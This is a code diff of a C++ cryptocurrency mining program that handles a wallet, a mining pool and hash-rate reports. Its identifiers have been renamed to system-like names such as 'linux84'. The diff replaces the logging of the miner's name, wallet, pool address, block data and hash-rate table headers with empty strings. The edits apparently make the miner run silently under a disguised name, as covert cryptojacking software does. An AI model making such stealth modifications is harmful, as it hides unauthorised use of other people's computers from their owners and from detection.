@@ -31,9 +31,9 @@ linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return 
     __running = false;
     __display_hits = 0;
 
-    LOG("linux84 name: " + __args.name());
-    LOG("Wallet: " + __args.wallet());
-    LOG("Pool address: " + __args.pool());
+    LOG("");
+    LOG("");
+    LOG("");
 
     vector<linux8474*> linux8474s = linux8474::get_linux8474s();
 	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
@@ -256,11 +256,7 @@ bool linux84::__update_pool_data() {
 
         if(__args.is_verbose()) {
             stringstream ss;
-            ss << "-----------------------------------------------------------------------------------------------------------------------------------------" << endl;
-            ss << "--> Pool data updated   Block: " << __blk << endl;
-            ss << "--> " << ((new_settings.argon2profile == "1_1_524288") ? "CPU round" : (new_settings.recommendation == "pause" ? "Masternode round" : "GPU round"));
-            ss << "  Height: " << __height << "  Limit: " << __limit << "  Difficulty: " << __difficulty << "  linux84: " << __args.name() << endl;
-            ss << "-----------------------------------------------------------------------------------------------------------------------------------------";
+            ss << "";
 
             LOG(ss.str());
             __display_hits = 0;
@@ -294,7 +290,7 @@ bool linux84::__display_report() {
         linux8412_count_gblocks += (*it)->get_linux8412_count_gblocks();
     }
 
-    header << "|TotalHR";
+    header << "";
     log << "|" << setw(7) << (int)linux8412_rate;
     for (vector<linux8474 *>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
         map<int, device_info> devices = (*it)->get_device_infos();
@@ -311,7 +307,7 @@ bool linux84::__display_report() {
                 log << "|" << setw(5) << (int)(d->second.gblock_linux8412rate);
         }
     }
-    header << "|Avg(C)|Avg(G)|     Time|Acc(C)|Acc(G)|Rej(C)|Rej(G)|Block|";
+    header << "";
     log << "|" << setw(6) << (int)avg_linux8412_rate_cblocks
             << "|" << setw(6) << (int)avg_linux8412_rate_gblocks
             << "|" << setw(9) << format_seconds(total_time)
